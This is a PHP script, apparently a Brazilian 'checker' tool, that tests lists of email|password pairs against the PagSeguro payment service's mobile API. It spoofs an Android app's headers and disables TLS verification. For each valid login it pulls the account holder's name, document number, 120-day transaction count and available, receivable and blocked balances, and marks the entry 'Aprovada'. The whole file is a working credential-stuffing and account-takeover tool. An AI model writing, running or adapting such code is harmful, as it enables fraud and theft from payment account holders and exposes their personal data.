
<?php
date_default_timezone_set("America/Sao_Paulo");
error_reporting(0);
set_time_limit(0);


extract($_GET);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/americanas.txt")) {
		unlink(getcwd()."/americanas.txt");
	}  

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/auth");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($target, CURLOPT_PROXY, $proxy); 
curl_setopt($target, CURLOPT_PROXYUSERPWD, "$username:$password");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'App-Version: 3.16.2',
		'Host: mb.api.pagseguro.uol',
		'Content-Type: application/json; charset=UTF-8',
		'App-Device: samsung / SM-G930K',
		'App-OS: Android 4.4.2 / Api-19',
		'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
		'Connection: Keep-Alive'));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","userName":"'.$email.'"}');
	$resposta = curl_exec($ch);
	//echo $resposta;

	$dados = json_decode($resposta, true);
	$token = $dados['accessToken'];

	//echo $data['name'];

	if (strpos($resposta, 'PF')) {
		$tipo = "Pessoa Física";
	}else{
		$tipo = "Pessoa Juridica";
	}



	if (strpos($resposta, 'name')) {

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/transactions?daysBefore=120&page=1&operationType=ALL");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($target, CURLOPT_PROXY, $proxy); 
curl_setopt($target, CURLOPT_PROXYUSERPWD, "$username:$password");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'App-Version: 3.16.2',
		'Host: mb.api.pagseguro.uol',
		'Content-Type: application/json; charset=UTF-8',
		'App-Device: samsung / SM-G930K',
		'App-OS: Android 4.4.2 / Api-19',
		'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
		'X-Token: '.$token.'',
		'Connection: Keep-Alive'));
	$resposta2 = curl_exec($ch);

	$dados2 = json_decode($resposta2, true);
	$dados2 = $dados2['lastTransactions'];

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/balances");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($target, CURLOPT_PROXY, $proxy); 
curl_setopt($target, CURLOPT_PROXYUSERPWD, "$username:$password");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'App-Version: 3.16.2',
		'Host: mb.api.pagseguro.uol',
		'Content-Type: application/json; charset=UTF-8',
		'App-Device: samsung / SM-G930K',
		'App-OS: Android 4.4.2 / Api-19',
		'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
		'X-Token: '.$token.'',
		'Connection: Keep-Alive'));
	$resposta3 = curl_exec($ch);
	$dados3 = json_decode($resposta3, true);




		echo "<span class='badge badge-success'>Aprovada</span> ".$email."|".$senha." <span class='badge badge-info'>  ".$dados['name']." </span>&nbsp <span class='badge badge-info'> ".$dados['document']." </span>&nbsp Transações (120 dias): ".count($dados2)." </span> <span class='badge badge-info'> ".$dados['pagSeguroUserType']." </span>&nbsp <span class='badge badge-info'> ".$tipo." </span>&nbsp <span class='badge badge-info'> R$ ".$dados3['balanceAvailable']." </span> &nbsp <span class='badge badge-info'> R$ ".$dados3['balanceReceivable']." </span> &nbsp <span class='badge badge-info'> R$ ".$dados3['balanceBlocked']." </span>&nbsp <span class='badge badge-info'>#alex 🏄#0171 </span>  <br>";


		flush();
		ob_flush();
	}else{
		echo "<span class='badge badge-danger'>#REPROVADA</span> ".$email." | ".$senha." <br>";

		flush();
		ob_flush();
	}
}



?>